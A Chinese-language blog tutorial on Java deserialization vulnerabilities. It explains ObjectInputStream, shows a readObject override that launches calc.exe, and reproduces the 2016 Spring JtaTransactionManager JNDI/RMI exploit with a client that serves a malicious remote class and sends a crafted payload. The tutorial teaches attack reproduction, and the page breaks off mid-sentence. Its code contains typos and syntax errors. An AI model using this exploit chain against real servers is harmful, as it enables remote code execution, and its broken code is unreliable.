# Java反序列化漏洞

------

## Java序列化和反序列化

```
	Java序列化: 把Java对象转换为字节序列的过程保存在内存，文件，数据库中，ObjectOutputStream类的writeObject()方法可以实现序列化
	Java反序列化: 把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化

```

![serialization-01.png](https://aaron-13.github.io/images/serialization-01.png)

序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储。主要应用以下场景:

```
	HTTP: 多平台之间的通信，管理等
	RMI: 是Java的一组用户开发分布应用程序的API，实现了不同操作系统之间程序的方法调用。RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口。
	JMX: JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理，中间件软件WebLogic的管理页面是基于JMX开发的，JBoss则整个系统都基于JMX构架。
```

## 漏洞历史

```
	15年: Apache Commons Collections反序列化远程执行漏洞，其当初影响范围: WebSphere,JBoss,Jekins,WebLogic和OpenNMSd等
	16年: Spring RMI反序列化漏洞，Jackson，FastJson
```

## 漏洞成因

```
	漏洞或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行难恶意代码

	两个或多个看似安全的模块在同一运行环境下，共同产生的安全问题
```

## 漏洞基本原理

实现序列化与反序列化

```java

import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.*;

public class serialization {
	public static void main(String args[]) throws Exception {
		//定义obj对象
		String obj = "hello world";
		//创建一个包含对象进行反序列化信息的“object”数据文件
		FileOutputStream fos = new FileOutputStream("object");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		//writeObject()方法将obj对象写入object文件
		os.writeObject(obj);
		os.close();
		//从文件中读取反序列化obj对象
		FileInputStream fis = new FileInputStream("object");
		ObjectInputStream ois = new ObjectInputStream(fis);
		//readObject()方法读取对象
		String obj2 = (String)ois.readObject();
		System.out.print(obj2);
		ois.close();	
	}
}
```

![serialization-02.png](https://aaron-13.github.io/images/serialization-02.png)

上面代码将String对象obj1序列化后写入object文件中，后又从该文件反序列化得到该对象。

![serialization-03.png](https://aaron-13.github.io/images/serialization-03.png)

这里需要注意的是，`aced 0005`是java序列化内容的特征，如果经过base64编码，那么相对应的是`r00AB`:

![serialization-04.png](https://aaron-13.github.io/images/serialization-04.png)


```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.*;


public class Serialize {
	public static void main(String args[]) throws Exception {
		//定义一个obj对象
		MyObject myobj = new MyObject();
		myobj.name = "so serious";
		//创建一个对象包含反序列化信息的obj数据文件
		FileOutputStream fos = new FileOutputStream("obj");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		//writeObject()方法 将对象写入obj文件
		os.writeObject(myobj);
		os.close();
		//从文件中读取反序列化信息
		FileInputStream fis = new FileInputStream("obj");
		ObjectInputStream ois = new ObjectInputStream(fis);
		//readObject()方法将反序列化信息序列化显示
		MyObject ObjectFromDisk = (MyObject)ois.readObject();
		System.out.println(ObjectFromDisk.name);
		ois.close();
		
	}		
}
class MyObject implements Serializable {
	public String name;
	//重写readObject方法
	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException {
		in.defaultReadObject();
		Runtime.getRuntime().exec("C:\\Windows\\system32\\calc.exe");
	}	
}
```


![serialization-05.png](https://aaron-13.github.io/images/serialization-05.png)

这次写了一个class来进行对象的序列化和反序列化，MyObject类有一个公共属性name，myobj实例化后将myobj.name赋值为了so seriou，然后 序列化写入文件object：

![serialization-06.png](https://aaron-13.github.io/images/serialization-06.png)


MyObject类实现了`Serializable`接口的类的对象才可以被序列化，Serializable接口是启用其序列化功能的接口，实现java.io.Serializable接口的类才是可序列化的，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。这里的readObject()执行了Runtime.getRuntime().exec("..."),而readObject()方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject()是可以重写的，可以定义反序列化的一些行为。


## 安全隐患

2016年的Spring框架的反序列化漏洞，该漏洞是利用了RMI以及JNDI:

```
RMI(Remote Method Invocation) 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP(Java Remote Message Protocol,Java远程消息交换协议)以及CORBA

JNDI(Java Naming and Directory Interface) 是一个应用程序设计的API，为开发人员提供查找和访问各种命名和目录服务的通用的、统一的接口。JNDI支持的主要服务有以下几种: DNS,LDAP,CORBA对象服务,RMI等
```

简单的来说RMI注册的服务可以让JNDI应用程序来访问，调用

Spring框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理。

为了复现漏洞，模拟搭建Server和Client服务;Server主要功能是监听某个端口，读取送达该端口的序列化后的对象，然后反序列化还原得到该对象；client负责发送序列化后的对象，运行环境需要在Spring框架下。


server端代码:

![server-01.png](https://aaron-13.github.io/images/server-01.png)

client端代码:

```java
public class ExploitClient{
	public static void main(String args[]) {
		try {
			String serverAddress = args[0];
			int port = Integer.parseInt(args[1]);
			String localAddress = args[2];
			//启动web server，提供远程下载要调用类的接口
			System.out.println("Starting Http server");
			HttpServer httpServer = HttpServer.create(new InetSocketAddress(8088), 0);
			httpServer.createContext("/",new HttpFileHandler());
			httpServer.setExecutor(null);
			httpServer.start();
			//下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class
			System.out.println("creating RMI registry");
			Registry registry = LocateRegistry.createRegistry(1099);
			Reference reference = new javax.naming.Reference("ExportObject",http://+serverAddress+"/");
			ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
			registry.bind("Object",referenceWrapper);
			System.out.println("Connection to server "+serverAddress+":"+port);
			Socket socket = new Socket(serverAddress,port);
			System.out.println("Connected to server");
			//jndi调用地址
			String jndiAddress = "rmi://"+localAddress+":1099/Object";
			org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
			object.setUserTransactionName(jndiAddress);
			//发送payload
			System.out.println("Sending object to server...");
			ObjectOutputStream os = new ObjectOutputStream(socket.os());
			os.writeObject(object);
			os.flush();
			while(true) {
				Thread.sleep(1000);
			} 

		} catch (Execption e) {
			e.printStackTrace();
		}
	}

}
```


最后是ExportClient，包含测试用执行的命令

```java
public class ExportClient {
	public static void main(String args[]) {
		String sb ="";
		BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
		BufferedReader inBr = new BufferReader(new InputStreamReader(in));
		String lineStr;
		while ((lineStr = inBr.readLine()) != null) 
			sb += lineStr + "/n";
			inBr.close();
			in.close();
			return sb;
	}
	public ExportObject() throws Exception {
		String cmd = "C:\\Windows\\system32\\calc.exe";
		throw new Exception(exec(cmd));
	}
}
```

![serialize-02.png](https://aaron-13.github.io/images/serialize-02.png)


这里向server发送的payload是:

```
	//jndi的调用地址
	String jndiAddress = "rmi://127.0.0.1:1999/Object"
	//实例化JtaTransactionManager对象，并且初始化UserTransactionName变量
	JtaTransactionManager Object = new JtaTransactionManager();
	object.setUserTransactionName(jndiAddress);

```

JtaTransactionManager类存在的问题，最终导致了漏洞的实现，这里向Server发送的序列化后的对象就是JtaTransactionManager对象，JtaTransactioManager实现了Java Transaction API，即JTA，JTA允许应用程序执行分布式事务处理--在两个或多个网络计算机资源上访问并且更新数据。

反序列化时会调用被序列化类的readObject()方法，readObject()可以重写而实现一些其他的功能

```
private void readObject(ObjectInputStream ois) throws IOExecption,ClassNotFoundExecption {
	// Rely on default serialization;just initialize state after deserialization
	ois.defaultReadObject();
	//create template for client-site JNDI lookup
	this.jndiTemplate = new jndiTemplate();
	//Perform a fresh lookup for JTA handles
	initUserTransactionAndTransactionManager();
	initTransactionSychronizationRegistry();
}
```

方法initUserTransactionAndTransactionManager()是用来初始化UserTransaction以及TransactionManager,